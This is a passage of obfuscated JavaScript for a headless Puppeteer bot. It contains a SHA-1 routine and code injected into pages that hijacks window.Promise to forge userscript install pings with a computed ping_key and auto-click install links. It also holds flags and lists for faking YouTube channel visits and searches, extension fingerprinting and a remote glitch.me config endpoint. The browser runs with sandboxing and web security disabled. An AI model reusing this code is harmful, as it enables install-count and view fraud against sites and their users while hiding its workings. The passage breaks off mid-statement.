                J[0x629 * -0x5 + 0x1ff4 + -0x117] = this['block'], J[K >> 0x883 * -0x4 + 0x7cc + 0x1a42] |= x[-0xb6 * -0x1f + -0x1889 + 0x282 & K], this['block'] = J[-0x1b59 * 0x1 + -0x3 * -0x3e1 + 0x2 * 0x7e3], K >= 0xa85 * 0x1 + 0x1d * 0x8e + -0x1a63 && (this['hashed'] || this['hash'](), J[-0x22f + 0x30d * 0x5 + -0x2 * 0x689] = this['block'], J[-0xe * -0x103 + 0x214a * 0x1 + -0x2f64] = J[-0xb * -0x71 + 0xf1b + -0x6a7 * 0x3] = J[-0x2a6 * 0x2 + 0xe9 * 0xf + -0x859] = J[0x19ea + 0xf6e + -0x3 * 0xdc7] = J[0x138b + -0x5b9 + 0x13 * -0xba] = J[-0x1eb7 + -0x15fb * -0x1 + 0xf9 * 0x9] = J[0xcc5 + -0xde5 + -0x62 * -0x3] = J[0xaad + -0x204b + 0x15a5 * 0x1] = J[0x185a + -0x1 * -0x356 + -0x1ba8] = J[0xd1d + -0x183f + -0x3 * -0x3b9] = J[-0x35b * 0x3 + -0x2458 + 0x2e73] = J[0x2604 + -0x1 * 0x23ce + 0x25 * -0xf] = J[-0x50b * 0x5 + -0x35 * 0x37 + -0x1 * -0x24a6] = J[-0x464 + -0xa01 + 0xe72] = J[-0x26bf + 0x8 * 0x2b + 0x2575] = J[-0x2250 + -0x25cd + 0x482c] = 0x1749 + -0x1 * 0x1b3e + 0x3f5), J[-0x22b3 + -0x4a3 * 0x7 + 0x2 * 0x219b] = this['hBytes'] << -0x1 * 0x1902 + -0xbdd + 0x24e2 * 0x1 | this[T(0x11, 'GC5J')] >>> -0xb41 + 0x8 * 0x18f + -0x11a, J[0x1064 * -0x2 + -0xd3b + -0x1709 * -0x2] = this['bytes'] << 0x10d3 + -0x50c + -0xbc4, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1e08 + -0x20f8 + -0x18 * -0x20; J < 0xbd4 + -0x24f4 + 0x1970; ++J)
                K = Q[J - (-0x5 * 0x77c + 0x56f + 0x1 * 0x2000)] ^ Q[J - (-0x131 * -0x1d + -0x1822 + -0xa63)] ^ Q[J - (0x3cd + -0x1 * 0x18c1 + 0x1502)] ^ Q[J - (0x19 * 0xad + -0x2 * 0xa51 + -0x1 * -0x3cd)], Q[J] = K << 0x11fb + -0xac * 0x18 + -0x1da | K >>> 0x12f8 + 0x1c7a + 0x1 * -0x2f53;
              for (J = 0x1278 + 0x2072 + -0x746 * 0x7; J < -0x1 * -0x269 + 0x1b0b * -0x1 + -0x1 * -0x18b6; J += 0x8ce + 0x1 * -0x1f26 + -0x19 * -0xe5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x9ef + -0x1da1 + 0x13b7 | L >>> -0x41f * -0x2 + 0x2df + -0xb02) + (M & N | ~M & O) + P + (0x178be8a5 * 0x7 + 0x6a3e2dbf + -0xb48f10a9) + Q[J] << -0x5 * 0x175 + -0x1f7b + 0x26c4) << 0x2 * -0xe0 + 0xfdf * -0x1 + 0x11a4 | P >>> -0x103d + -0xd8d + 0x1de5) + (L & (M = M << 0x1 * -0xc83 + -0x2135 + 0x16eb * 0x2 | M >>> -0x18f * 0x5 + 0x2027 * 0x1 + -0xc2d * 0x2) | ~L & N) + O + (-0x5529838f + 0xb40e8a92 * 0x1 + 0x23146b5 * -0x2) + Q[J + (0x1 * 0xedd + 0xb * 0x155 + 0x1d83 * -0x1)] << -0x17 * 0x17f + 0x1ad + 0x20bc) << -0x1620 + 0x1065 + -0x2e * -0x20 | O >>> -0xfe * -0x1e + -0x229 * 0x1 + -0x2 * 0xdc0) + (P & (L = L << -0x50c + 0x327 * -0x5 + 0x14ed | L >>> 0x16e8 + -0x7c8 + -0xf1e) | ~P & M) + N + (-0x510de751 + -0x1 * -0x619290f5 + -0x1bb * -0x2ac20f) + Q[J + (0x15c5 + 0x1f * -0x16 + 0x1 * -0x1319)] << -0x2 * -0xd51 + 0x1 * -0x1ba1 + 0xff) << 0x1a3 * -0x1 + -0x369 + 0x511 | N >>> -0x2441 + 0x1c8 + -0x2294 * -0x1) + (O & (P = P << -0x1 * 0x2466 + -0x1 * 0xed9 + 0x335d | P >>> 0x1cc9 + -0x24c + 0x1 * -0x1a7b) | ~O & L) + M + (-0xab54959 * -0x7 + -0x2a5 * -0x11457b + -0x1e1f461d * 0x1) + Q[J + (0x2 * -0x22 + -0x4d7 + 0x51e)] << -0xd0 + -0x1224 + 0x12f4) << 0x757 * -0x2 + -0xf02 + -0x27 * -0xc3 | M >>> -0x1c1b + -0x10 * 0x24a + -0x206b * -0x2) + (N & (O = O << -0x7bf * 0x3 + 0x82 * 0x2f + -0x83 * 0x1 | O >>> 0x1198 + -0x3b2 + -0xde4) | ~N & P) + L + (-0x4692f15c + -0x2348be39 + 0xc45e292e) + Q[J + (-0x1 * -0x22d2 + -0x4cf * 0x1 + -0x7 * 0x449)] << -0xb9 + 0xba * 0x21 + 0x1741 * -0x1, N = N << -0x313 * 0x8 + 0x1d4b * -0x1 + 0x3601 | N >>> 0x14c2 * -0x1 + -0x227d + -0x45 * -0xcd;
              for (; J < -0x12 * 0x119 + 0x2 * 0xd6d + -0x10 * 0x6f; J += -0xff6 + -0x7 * 0x58b + 0x2 * 0x1b64)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xc2a + 0x718 + 0x517 | L >>> 0xb * 0xbd + -0x14df + 0xcdb) + (M ^ N ^ O) + P + (-0x7cc8bccb + 0x1a9a3be * 0x4f + 0x684920ca) + Q[J] << -0x2 * -0x345 + 0x7aa * 0x1 + -0xe34) << -0x1f5f + 0x2678 + -0x714 | P >>> -0x1156 + 0x447 * 0x9 + 0x9a * -0x23) + (L ^ (M = M << -0x1e * 0x56 + 0x15f5 + -0x1 * 0xbc3 | M >>> -0x23 * 0x33 + 0xf28 + -0x82d) ^ N) + O + (0xac922d * -0x65 + 0xc9907d7d + -0x16a0e61b) + Q[J + (-0x145d * 0x1 + -0x22fa + 0x3758)] << 0x1b * 0x29 + 0x9f2 + -0xe45) << -0xcca * -0x1 + 0x254a * -0x1 + 0x1885 | O >>> 0x1c7b + 0x1 * 0xfe7 + -0x2c47) + (P ^ (L = L << -0x1 * -0x3fb + 0x51 * 0x9 + -0x2 * 0x35b | L >>> -0x1 * 0x21c1 + 0xc9a + 0x1529) ^ M) + N + (0x3584eac2 * -0x1 + -0x31 * 0xca9c75 + 0xcb26c8c8) + Q[J + (-0x1fe5 + -0x76f + 0x2756)] << -0x1 * 0x2c2 + -0x1bdb * -0x1 + -0x1919) << -0x1 * 0x76d + -0x1a4b + 0xb3f * 0x3 | N >>> 0x843 + 0x23ab + -0x2bd3) + (O ^ (P = P << -0x5c * -0x1 + -0xe7 * 0x17 + 0x1483 | P >>> 0x19f4 + -0x1 * -0x19d9 + 0x33cb * -0x1) ^ L) + M + (-0x8182e2 * 0xab + 0x733e4f41 + 0x521e0956) + Q[J + (-0x70a + -0x2535 + 0x2c42)] << -0x2434 + -0x16 * -0x4 + 0x6c * 0x55) << -0x1c96 * -0x1 + -0xcfb + -0xa * 0x18f | M >>> 0x2ab * -0x3 + -0x1ce7 + 0x2503) + (N ^ (O = O << -0x8f2 + 0x1c0a + -0x2b6 * 0x7 | O >>> -0x3df * 0x3 + 0x1 * 0x2413 + -0x1 * 0x1874) ^ P) + L + (0x2d70346d + -0x10ca6 * 0x1fd + 0x437fdd42) + Q[J + (0x24f3 + -0xa9e + -0x1a51)] << -0xf78 + 0x3 * 0x457 + -0x273 * -0x1, N = N << -0x10 * -0x161 + 0x158c + -0x2b7e | N >>> 0x1b5b * 0x1 + -0x2397 + 0x5 * 0x1a6;
              for (; J < -0x139 * -0x8 + -0x11fa + 0x53 * 0x1a; J += -0x3 * 0xaf1 + 0x6bf * -0x5 + 0x12b * 0x39)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x16bb + 0x1520 + 0x1a0 | L >>> -0x313 * 0x7 + 0x1 * 0x16a7 + 0x1 * -0x107) + (M & N | M & O | N & O) + P - (0x4cfa4 * 0x7af + -0x1 * -0xc4c9eee1 + -0x78dd18d9) + Q[J] << -0x1354 + -0x1850 + 0x2ba4) << -0x337 * 0x2 + -0x1 * -0x6e5 + 0x72 * -0x1 | P >>> 0x57 * -0x9 + 0x229d + -0x61 * 0x53) + (L & (M = M << 0x5f1 + -0x2499 + 0x1ec6 | M >>> 0x18b5 + 0x1 * -0x7c3 + -0x10f0) | L & N | M & N) + O - (0xe1bf91f9 + -0x700f2e1a + -0x440ae9 * 0x3) + Q[J + (-0x1 * -0xe5 + -0x1862 + -0x3e * -0x61)] << 0x3 * -0x231 + 0xd2 + 0x1eb * 0x3) << 0x2135 + -0x1b30 + 0x18 * -0x40 | O >>> -0x1 * -0x229d + -0x15 + 0x7 * -0x4eb) + (P & (L = L << 0x11bb + 0xdb7 * 0x1 + -0x1f54 | L >>> 0x998 + -0x1 * -0x23dd + -0x2d73) | P & M | L & M) + N - (-0x129bb533 + 0x906526 * 0x149 + -0x75f * 0x755e1) + Q[J + (0x1050 + -0x1 * 0xfbf + -0xd * 0xb)] << 0x1 * -0x491 + 0x8e * -0x41 + 0x289f) << -0x65 * 0x2 + 0xbfb + 0x8f * -0x14 | N >>> -0x110f * 0x1 + -0x52 + 0x117c) + (O & (P = P << -0x4c2 * -0x4 + -0x1 * 0x15f7 + 0x47 * 0xb | P >>> 0x57 * 0x8 + 0x6c + 0x191 * -0x2) | O & L | P & L) + M - (-0x1e7f1d7d * 0x7 + -0x9d52ed29 + 0x3c761fd7 * 0x8) + Q[J + (0x1c15 + 0x184a + 0x45d * -0xc)] << -0x31a * -0x1 + 0x65 * 0x54 + -0x243e) << -0x6cb * -0x1 + -0xfb6 + 0x8f0 | M >>> -0x129e + 0x1 * -0x24e7 + -0xb2 * -0x50) + (N & (O = O << 0x2c * 0x6b + -0x19ab + -0x765 * -0x1 | O >>> -0x1 * 0xb29 + 0x116 * 0x1f + -0x1 * 0x167f) | N & P | O & P) + L - (-0x69 * 0x2b377b + 0x1a28737c + -0xeec394d * -0x7) + Q[J + (-0x890 + -0x19e7 + 0x227b)] << -0x25cd + -0x593 + -0x2 * -0x15b0, N = N << 0x24c1 + 0x10aa * 0x2 + 0x1 * -0x45f7 | N >>> -0x1052 + -0x349 + 0x139d;
              for (; J < -0x1 * 0xbd3 + -0x14fc + -0x3d * -0x8b; J += -0x15c2 + -0x98f * -0x3 + -0x6e6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x17ff * -0x1 + -0xb * -0x305 + -0x933 | L >>> 0x1 * 0x262d + -0xb85 + -0x1a8d) + (M ^ N ^ O) + P - (-0x89b3 * -0x5115 + -0x2a95 * -0x71f6 + -0x8f460b3) + Q[J] << -0x22b7 + 0x1 * 0x73d + 0x1b7a) << 0x183 * -0x10 + 0x1ae2 + 0x89 * -0x5 | P >>> -0x598 + -0x1b13 + 0x68e * 0x5) + (L ^ (M = M << -0x9be + 0x1 * 0x6c5 + 0x317 | M >>> 0x1179 + 0x917 + -0x1a8e) ^ N) + O - (0x61c9 * 0xec1d + -0x1 * -0x345a83d + -0x27d8c9d8) + Q[J + (-0xcc8 + 0x1 * -0x19b1 + 0x267a)] << 0x24d1 + 0x1ff2 + -0x44c3) << 0x161e + 0x949 * -0x4 + 0xf0b * 0x1 | O >>> -0x1 * 0x1a83 + -0xc19 * -0x2 + -0x7c * -0x5) + (P ^ (L = L << 0x1055 * 0x2 + -0x5a0 + 0x4 * -0x6bb | L >>> 0x2af + -0x1066 * -0x2 + 0x1 * -0x2379) ^ M) + N - (0x1297 * 0x12b3d + -0x4ecde61a + 0x1 * 0x6eb05949) + Q[J + (-0x222b + -0x1006 + 0x1 * 0x3233)] << 0x1 * 0x1f78 + 0x3b2 * -0x1 + -0x1bc6) << -0x1 * 0x1660 + 0x1dae + -0x1 * 0x749 | N >>> -0x45a + -0x142 + 0xb * 0x85) + (O ^ (P = P << 0x1 * -0x92b + 0x649 * -0x4 + 0x226d | P >>> 0x1523 + -0x369 + -0xbd * 0x18) ^ L) + M - (0x1 * 0x1aeaf11b + 0x268e44 * 0x1eb + -0x6c0147b * 0x7) + Q[J + (-0x304 + -0x1203 + 0x150a)] << -0x187b + -0x17b3 + -0x302e * -0x1) << -0x1a69 + 0x13e2 + 0x68c | M >>> 0xd53 * 0x1 + 0xfdd + -0x5 * 0x5d1) + (N ^ (O = O << 0x1 * 0x1249 + 0x11c9 + -0x23f4 | O >>> -0x9a + -0xdc7 + 0xe63) ^ P) + L - (0xc9508e6 + 0x4a981b06 + -0x218fe5c2) + Q[J + (0x2065 * -0x1 + -0x224d + 0x42b6)] << 0xe3 * 0xd + -0xe33 + 0x2ac, N = N << 0x25cc + 0x1 * 0x2592 + 0x1c * -0x2b0 | N >>> 0xcb7 + 0x8f2 + -0x15a7 * 0x1;
              this['h0'] = this['h0'] + L << 0xd * 0x1af + 0x17 * -0xfa + -0x93 * -0x1, this['h1'] = this['h1'] + M << 0x78e * -0x2 + -0xb4 * 0x5 + -0x1 * -0x12a0, this['h2'] = this['h2'] + N << -0x14bd + -0x51 * -0x2d + 0x680, this['h3'] = this['h3'] + O << 0x976 + -0x4cb * -0x3 + 0x167 * -0x11, this['h4'] = this['h4'] + P << -0x1c6a * 0x1 + -0x1 * -0x1afb + 0x16f;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x46d + -0x1ef0 + 0x2379 & -0x157 + 0x3bc * -0x2 + 0x1c6 * 0x5] + w[J >> 0x2147 + -0x1337 + -0xdf8 & 0x1 * 0x2684 + 0xd * -0x203 + -0xc4e] + w[J >> -0x15fc + 0x258b * 0x1 + -0x529 * 0x3 & 0x18a8 + -0x1 * -0xbf6 + -0x248f] + w[J >> 0x755 + -0x24a1 + 0x4 * 0x757 & -0x1 * 0x1697 + 0x30 * -0x5c + 0x27e6] + w[J >> -0xf * -0xff + 0x1110 + 0x38d * -0x9 & -0x2193 + -0x21af + 0x4351] + w[J >> 0x239a + 0x1ef4 + -0xd4e * 0x5 & -0x2e9 * -0x3 + -0x1af * -0x17 + -0x44f * 0xb] + w[J >> -0x3 * -0x955 + -0x1c5a + 0x5f & -0xef3 + -0x15a * 0x5 + 0x18e * 0xe] + w[-0x1c * -0x6e + 0x1cb7 + -0x2 * 0x1458 & J] + w[K >> 0x1bf + -0x67f * 0x5 + 0x1ed8 & 0x1 * 0x1aad + 0x13cc + 0x1 * -0x2e6a] + w[K >> 0x515 * 0x2 + -0x1cc1 + -0x1 * -0x12af & -0x47 * -0x84 + 0xc * -0x1b2 + 0x1 * -0x1035] + w[K >> -0x1a8e + 0x30a * 0x4 + -0xda * -0x11 & -0x196d + 0x17c1 + -0x1bb * -0x1] + w[K >> 0xfb6 + -0x163e + 0x698 & -0x269c + -0x1b6a + 0x4215] + w[K >> 0x108 * 0x8 + 0xb * -0x23d + -0x1 * -0x106b & 0x20c9 + 0x13b4 + 0x1a37 * -0x2] + w[K >> -0x402 + 0x1603 + -0x11f9 & 0xfc8 + -0xd46 + 0xd1 * -0x3] + w[K >> 0x23e8 + -0xb69 + -0x187b & 0x1cb * -0x4 + 0x4a9 + 0x292] + w[-0x2294 + 0x697 + 0x1c0c & K] + w[L >> -0x1e * -0x57 + -0x1 * -0x115 + -0x1 * 0xb2b & 0x18e0 + 0x1027 * -0x2 + 0x77d * 0x1] + w[L >> 0x1314 + 0x1 * 0x1dbf + -0x30bb & 0x1953 + -0x153a + 0x1 * -0x40a] + w[L >> -0xc4c + 0x2067 + -0x1 * 0x1407 & -0x24cb + 0x2493 + -0x47 * -0x1] + w[L >> -0x23ea + -0x1 * -0xb + 0x23ef & -0x2 * 0x449 + -0x3 * 0x182 + 0xd27] + w[L >> 0xdaa + 0xb02 * -0x2 + 0x866 & 0x6a4 + 0x1 * 0x17d + 0x409 * -0x2] + w[L >> -0x1d64 + -0x38 + 0x2 * 0xed2 & 0x2079 + 0xc27 + -0x2c91] + w[L >> 0x1 * -0x1795 + -0x394 * -0x1 + -0x29 * -0x7d & 0x21aa + 0x6 * 0x2ac + 0x1 * -0x31a3] + w[-0x2551 * 0x1 + 0x803 * -0x3 + 0x1 * 0x3d69 & L] + w[M >> -0x485 * -0x8 + -0x11 * -0x55 + 0x1 * -0x29b1 & -0x702 + 0x1ff0 + -0x18df] + w[M >> -0x1a12 + -0x56b + 0xa5 * 0x31 & 0x7 * 0x3b + 0x7a2 * 0x5 + 0x4f7 * -0x8] + w[M >> -0x1e90 + 0xd6 + 0x1dce & 0x1eba + -0x1 * 0x859 + -0x1 * 0x1652] + w[M >> -0x2 * -0x7ce + 0x2177 + -0x1 * 0x3103 & -0x275 * -0x4 + 0x1 * -0x2067 + 0x16a2] + w[M >> -0xaee * 0x2 + 0x2f * 0x80 + -0x198 & -0x49 * 0x51 + -0x79 * 0x3b + 0x330b] + w[M >> 0x1543 * -0x1 + 0xa9 * -0x4 + 0x17ef & -0x84e + -0x8b4 * 0x1 + 0x1111] + w[M >> -0x1f92 + 0x23a6 + -0x2 * 0x208 & -0x1 * -0x1e42 + 0x255a + -0x438d * 0x1] + w[0x259d + -0x279 + -0x2315 & M] + w[N >> -0x39 * 0xab + -0x74 * -0x12 + 0x1e07 & -0xc41 + 0x1621 * -0x1 + -0x1 * -0x2271] + w[N >> 0x1 * 0x65 + 0x2d4 + -0x321 & 0xb22 + -0x1ec + 0x30d * -0x3] + w[N >> 0x1e39 + 0x3b * 0x35 + -0x2a5c & 0x21f7 + -0x124e + -0x7cd * 0x2] + w[N >> -0x34d + 0x1a0f + 0x2 * -0xb59 & -0x925 * -0x3 + 0x1c79 + -0x37d9 * 0x1] + w[N >> -0x4 * 0x654 + -0xf + 0x196b & 0x16ef + 0x1cd5 + -0x1ab * 0x1f] + w[N >> -0x1569 + -0x12e1 * -0x1 + -0x4 * -0xa4 & -0x1 * -0xd91 + 0x7c4 + -0x1546] + w[N >> -0x3ef * -0x1 + -0x1bd1 + -0x2e * -0x85 & 0x1 * 0x1a99 + 0x52f * 0x4 + -0x2f46] + w[0xb * -0x106 + 0x2 * -0x12ee + 0x1 * 0x312d & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x54c + 0x37 * -0x8f + -0x739 * -0x5 & 0x25ca + 0x1a2d * 0x1 + -0x3ef8,
                J >> -0x20c2 * 0x1 + -0x263b + 0x470d & 0x2210 + 0x1582 + -0x3693,
                J >> 0x7 * -0x49b + -0x14e5 + 0x352a & 0x220c + 0xa06 * 0x1 + -0x2b13,
                -0x1 * 0xb66 + 0x1638 + -0x1f7 * 0x5 & J,
                K >> -0x1 * 0x1119 + 0x1 * -0xc83 + -0x1db4 * -0x1 & 0xe43 + -0x1d31 + 0xfed,
                K >> 0x119 * -0x1a + -0x17f + -0x1e19 * -0x1 & -0x1c14 + -0x9 * -0x3b7 + -0x45c,
                K >> 0xc89 + 0x2ab * -0xd + 0x162e & 0xdb8 + 0x1 * 0x1b0a + -0x27c3,
                -0x21ea + 0x242b + -0x142 & K,
                L >> 0x223c + 0x1 * 0x12e9 + -0x350d & -0x23 * 0x2f + 0x4e4 + 0x288,
                L >> -0x580 + 0x742 * 0x1 + -0xe * 0x1f & 0x1 * 0x7ab + 0x12be * -0x1 + 0xc12,
                L >> -0xcd * -0x5 + 0x86 * 0x49 + -0x2a2f & 0x2 * -0xe4e + -0x21c6 + 0x3f61,
                0x17d * 0x5 + -0x17 * 0x1f + -0x3a9 & L,
                M >> 0x1 * -0x59e + 0x21 * -0x8b + 0x17a1 & -0x14aa + -0x31a + 0x1 * 0x18c3,
                M >> 0x132c + -0x6d * -0xf + -0x6b * 0x3d & -0xf * 0x139 + 0x2311 + -0xfbb * 0x1,
                M >> 0x542 + 0x18 * -0xa + -0x44a & -0x1a47 + 0x2 * -0x7ac + 0x2 * 0x154f,
                0x25e0 + -0x45d + 0x821 * -0x4 & M,
                N >> 0xd27 + -0xf8e + 0x27f & -0xd6a * 0x2 + 0x206a + -0x497,
                N >> 0x1e31 + 0x1b * -0x15d + 0x26 * 0x2d & -0x1 * -0x45b + 0xcf * -0x3 + -0x1 * 0xef,
                N >> -0xb * -0x7f + -0x1974 + 0x1407 * 0x1 & -0x2168 + -0x2 * -0xc14 + 0x1 * 0xa3f,
                0x186f + -0x18cf + 0x1 * 0x15f & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1e66 + -0x9 * -0x2a9 + -0x1d * 0x1df), (K = new DataView(J))['setUint32'](0x1 * 0x2205 + -0xcef + -0xa8b * 0x2, this['h0']), K['setUint32'](0x1aee + 0x4ec + -0x1fd6, this['h1']), K['setUint32'](-0x1088 + 0xa4 * 0x26 + -0x7c8, this['h2']), K['setUint32'](-0x1dbb + 0xc92 * 0x3 + -0x7ef, this['h3']), K['setUint32'](0x1be3 + 0x5 * -0x353 + -0xb34, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x2366 + 0x1f * 0xc4 + -0x3b22];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x3 * 0x97a + -0x3c8 + -0x18a6;
            J[-0x1fc + -0x167 * 0x1 + -0x11 * -0x33]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1105 + -0x11f8 + 0x22fd] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * 0x269 + -0x4bb * -0x2 + 0x16 * -0x52), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1f5c + 0x1 * -0x1985 + 0x3 * -0x1f2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1 * 0x1ae0 + -0x7 * -0x417 + -0x31a5), Promise['resolve'](0xa0a + -0x322 + -0x6e7);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x64d * -0x6 + 0x5 * 0x362 + 0x1c * 0xbf; j < 0x7a0 * 0x2 + 0x1 * -0x3e6 + -0xb59; j++)
    i();
}
const NETWORK_PATIENCE = 0x3b5f + -0xe9 * 0x1a + -0x475 + (0x7 * -0xdc + 0x16ee + 0xbe * -0x7) * Math['random'](),
  MM_NETWORK_PATIENCE = (0xebc + 0x1508 + -0x1 * 0x23c1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1ecd * 0x1 + -0x83 + 0x1f5 * 0x10; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + U(0x12, 'S67e') + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 